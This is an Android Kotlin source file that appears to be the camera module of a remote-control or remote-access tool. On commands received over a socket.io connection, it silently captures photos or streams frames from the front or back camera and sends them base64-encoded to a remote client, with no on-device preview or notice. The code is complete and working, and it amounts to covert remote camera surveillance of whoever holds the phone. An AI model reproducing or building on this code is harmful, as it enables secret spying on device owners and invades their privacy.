package com.remote.system

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.content.ContextCompat
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class CameraCommand(private val context: Context) : CommandHandler {
    private val tag = "CameraCommand"
    
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var captureSession: CameraCaptureSession? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    
    private var isStreaming = false
    private var currentSocket: Socket? = null
    private var currentClientId: String? = null

    init {
        cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        val action = params.optString("action", "capture")
        
        when (action) {
            "capture" -> capturePhoto(params, clientId, socket)
            "start_stream" -> startVideoStream(params, clientId, socket)
            "stop_stream" -> stopVideoStream(clientId, socket)
            "list_cameras" -> listCameras(clientId, socket)
            else -> sendErrorResponse("Unknown action: $action", clientId, socket)
        }
    }

    private fun capturePhoto(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkCameraPermission()) {
            sendErrorResponse("Camera permission not granted", clientId, socket)
            return
        }

        try {
            val cameraType = params.optString("camera", "back") // "front" or "back"
            val quality = params.optInt("quality", 80) // JPEG quality 1-100
            
            val cameraId = getCameraId(cameraType)
            if (cameraId == null) {
                sendErrorResponse("$cameraType camera not found", clientId, socket)
                return
            }

            startBackgroundThread()
            openCameraForCapture(cameraId, quality, clientId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error capturing photo", e)
            sendErrorResponse("Failed to capture photo: ${e.message}", clientId, socket)
        }
    }

    private fun startVideoStream(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkCameraPermission()) {
            sendErrorResponse("Camera permission not granted", clientId, socket)
            return
        }

        if (isStreaming) {
            sendErrorResponse("Camera stream already active", clientId, socket)
            return
        }

        try {
            val cameraType = params.optString("camera", "back")
            val fps = params.optInt("fps", 10) // Frames per second for streaming
            
            val cameraId = getCameraId(cameraType)
            if (cameraId == null) {
                sendErrorResponse("$cameraType camera not found", clientId, socket)
                return
            }

            currentSocket = socket
            currentClientId = clientId
            isStreaming = true

            startBackgroundThread()
            openCameraForStream(cameraId, fps, clientId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error starting video stream", e)
            sendErrorResponse("Failed to start video stream: ${e.message}", clientId, socket)
        }
    }

    private fun stopVideoStream(clientId: String, socket: Socket) {
        try {
            isStreaming = false
            currentSocket = null
            currentClientId = null
            
            captureSession?.close()
            cameraDevice?.close()
            imageReader?.close()
            stopBackgroundThread()

            val response = JSONObject()
            response.put("success", true)
            response.put("command", "camera")
            response.put("action", "stop_stream")
            response.put("clientId", clientId)
            socket.emit("command-response", response)

            Log.d(tag, "Video stream stopped successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error stopping video stream", e)
            sendErrorResponse("Failed to stop video stream: ${e.message}", clientId, socket)
        }
    }

    private fun listCameras(clientId: String, socket: Socket) {
        try {
            val response = JSONObject()
            val data = JSONObject()
            val cameras = mutableListOf<JSONObject>()

            cameraManager?.cameraIdList?.forEach { cameraId ->
                val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                val cameraInfo = JSONObject()
                cameraInfo.put("id", cameraId)
                cameraInfo.put("facing", when(facing) {
                    CameraCharacteristics.LENS_FACING_FRONT -> "front"
                    CameraCharacteristics.LENS_FACING_BACK -> "back"
                    else -> "unknown"
                })

                cameras.add(cameraInfo)
            }

            data.put("cameras", cameras)
            data.put("count", cameras.size)

            response.put("success", true)
            response.put("data", data)
            response.put("command", "camera")
            response.put("action", "list_cameras")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "Camera list sent successfully: ${cameras.size} cameras")

        } catch (e: Exception) {
            Log.e(tag, "Error listing cameras", e)
            sendErrorResponse("Failed to list cameras: ${e.message}", clientId, socket)
        }
    }

    private fun getCameraId(cameraType: String): String? {
        return try {
            val targetFacing = when (cameraType.lowercase()) {
                "front" -> CameraCharacteristics.LENS_FACING_FRONT
                "back" -> CameraCharacteristics.LENS_FACING_BACK
                else -> CameraCharacteristics.LENS_FACING_BACK
            }

            cameraManager?.cameraIdList?.find { cameraId ->
                val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
                characteristics?.get(CameraCharacteristics.LENS_FACING) == targetFacing
            }
        } catch (e: Exception) {
            Log.e(tag, "Error getting camera ID", e)
            null
        }
    }

    private fun openCameraForCapture(cameraId: String, quality: Int, clientId: String, socket: Socket) {
        try {
            val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
            val map = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            
            // Choose image size (720p for photos)
            val imageSize = map?.getOutputSizes(ImageFormat.JPEG)?.find { 
                it.width <= 1280 && it.height <= 720 
            } ?: Size(640, 480)

            imageReader = ImageReader.newInstance(imageSize.width, imageSize.height, ImageFormat.JPEG, 1)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                image?.let {
                    processCapturedImage(it, quality, clientId, socket, false)
                    it.close()
                }
            }, backgroundHandler)

            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession(listOf(imageReader?.surface!!))
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    sendErrorResponse("Camera error: $error", clientId, socket)
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            sendErrorResponse("Camera permission denied", clientId, socket)
        } catch (e: Exception) {
            Log.e(tag, "Error opening camera", e)
            sendErrorResponse("Failed to open camera: ${e.message}", clientId, socket)
        }
    }

    private fun openCameraForStream(cameraId: String, fps: Int, clientId: String, socket: Socket) {
        try {
            val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
            val map = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            
            // Choose smaller size for streaming (480p)
            val imageSize = map?.getOutputSizes(ImageFormat.JPEG)?.find { 
                it.width <= 640 && it.height <= 480 
            } ?: Size(320, 240)

            imageReader = ImageReader.newInstance(imageSize.width, imageSize.height, ImageFormat.JPEG, 2)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                if (isStreaming) {
                    val image = reader.acquireLatestImage()
                    image?.let {
                        processCapturedImage(it, 60, clientId, socket, true) // Lower quality for streaming
                        it.close()
                    }
                }
            }, backgroundHandler)

            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createStreamingSession(fps)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    sendErrorResponse("Camera error: $error", clientId, socket)
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            sendErrorResponse("Camera permission denied", clientId, socket)
        } catch (e: Exception) {
            Log.e(tag, "Error opening camera for stream", e)
            sendErrorResponse("Failed to open camera for stream: ${e.message}", clientId, socket)
        }
    }

    private fun createCaptureSession(surfaces: List<Surface>) {
        try {
            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    captureStillPicture()
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(tag, "Capture session configuration failed")
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e(tag, "Error creating capture session", e)
        }
    }

    private fun createStreamingSession(fps: Int) {
        try {
            cameraDevice?.createCaptureSession(listOf(imageReader?.surface!!), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    startRepeatingStream(fps)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(tag, "Streaming session configuration failed")
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e(tag, "Error creating streaming session", e)
        }
    }

    private fun captureStillPicture() {
        try {
            val reader = imageReader ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(reader.surface)
            captureBuilder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

            captureSession?.capture(captureBuilder?.build()!!, null, backgroundHandler)
        } catch (e: Exception) {
            Log.e(tag, "Error capturing still picture", e)
        }
    }

    private fun startRepeatingStream(fps: Int) {
        try {
            val reader = imageReader ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            captureBuilder?.addTarget(reader.surface)
            captureBuilder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

            // Set frame rate for streaming
            val fpsRange = android.util.Range(fps, fps)
            captureBuilder?.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, fpsRange)

            captureSession?.setRepeatingRequest(captureBuilder?.build()!!, null, backgroundHandler)
        } catch (e: Exception) {
            Log.e(tag, "Error starting repeating stream", e)
        }
    }

    private fun processCapturedImage(image: Image, quality: Int, clientId: String, socket: Socket, isStream: Boolean) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            // Compress if needed for streaming
            val finalBytes = if (isStream && bytes.size > 50000) { // 50KB limit for streaming
                compressImage(bytes, 40) // Lower quality for streaming
            } else if (!isStream) {
                compressImage(bytes, quality)
            } else {
                bytes
            }

            val base64Data = Base64.encodeToString(finalBytes, Base64.DEFAULT)

            val response = JSONObject()
            val data = JSONObject()
            data.put("imageData", base64Data)
            data.put("imageSize", finalBytes.size)
            data.put("timestamp", System.currentTimeMillis())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "camera")
            response.put("action", if (isStream) "stream_frame" else "capture")
            response.put("clientId", clientId)

            socket.emit("command-response", response)

            if (!isStream) {
                // Close resources after single capture
                captureSession?.close()
                cameraDevice?.close()
                imageReader?.close()
                stopBackgroundThread()
            }

        } catch (e: Exception) {
            Log.e(tag, "Error processing captured image", e)
        }
    }

    private fun compressImage(imageBytes: ByteArray, quality: Int): ByteArray {
        return try {
            val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
            bitmap.recycle()
            outputStream.toByteArray()
        } catch (e: Exception) {
            Log.e(tag, "Error compressing image", e)
            imageBytes // Return original if compression fails
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground")
        backgroundThread?.start()
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(tag, "Error stopping background thread", e)
        }
    }

    private fun checkCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == 
               PackageManager.PERMISSION_GRANTED
    }

    private fun sendErrorResponse(error: String, clientId: String, socket: Socket) {
        try {
            val errorResponse = JSONObject()
            errorResponse.put("success", false)
            errorResponse.put("error", error)
            errorResponse.put("command", "camera")
            errorResponse.put("clientId", clientId)
            socket.emit("command-response", errorResponse)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending error response", e)
        }
    }
}
